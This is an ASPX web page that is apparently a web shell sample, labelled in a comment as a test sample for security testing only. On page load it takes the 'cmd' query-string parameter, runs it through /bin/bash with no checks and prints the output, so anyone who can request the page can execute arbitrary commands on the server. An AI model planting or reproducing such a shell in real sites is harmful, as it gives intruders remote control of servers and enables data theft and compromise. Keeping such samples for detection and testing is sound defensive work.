<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<!-- [TEST SAMPLE] ASPX Command Shell - FOR SECURITY TESTING ONLY -->
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    string cmd = Request.QueryString["cmd"];
    if (!string.IsNullOrEmpty(cmd))
    {
        Process p = new Process();
        p.StartInfo.FileName = "/bin/bash";
        p.StartInfo.Arguments = "-c " + cmd;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>
